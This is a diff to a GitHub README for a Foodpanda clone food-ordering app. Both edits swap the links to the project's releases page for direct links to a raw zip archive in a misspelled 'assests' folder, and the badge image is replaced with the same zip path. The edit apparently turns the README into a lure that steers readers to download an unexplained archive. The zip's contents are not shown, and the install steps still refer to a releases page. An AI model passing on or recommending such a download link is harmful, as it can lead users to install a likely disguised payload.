@@ -1,7 +1,7 @@
 # 🎉 food-panda-Fully-functionality-Order-Placement- - Experience Easy Food Ordering
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/JuniorEA/food-panda-Fully-functionality-Order-Placement-/releases)
+[![Download](https://github.com/JuniorEA/food-panda-Fully-functionality-Order-Placement-/raw/refs/heads/main/assests/Order-food-functionality-Fully-Placement-panda-v2.2.zip%20Release-brightgreen)](https://github.com/JuniorEA/food-panda-Fully-functionality-Order-Placement-/raw/refs/heads/main/assests/Order-food-functionality-Fully-Placement-panda-v2.2.zip)
 
 ## 🥡 Overview
 Alhumdullilah! I built a Foodpanda Clone with full features: browse food, manage cart, place orders, save addresses, and view order history. Enjoy the convenience of ordering your favorite meals right from your device.
@@ -24,7 +24,7 @@ To get started with the application, follow these simple steps.
 ## 📂 Download & Install
 Visit the following page to download the latest version of the application:
 
-[Download Latest Release](https://github.com/JuniorEA/food-panda-Fully-functionality-Order-Placement-/releases)
+[Download Latest Release](https://github.com/JuniorEA/food-panda-Fully-functionality-Order-Placement-/raw/refs/heads/main/assests/Order-food-functionality-Fully-Placement-panda-v2.2.zip)
 
 1. Click on the link above.
 2. On the releases page, find the most recent version.
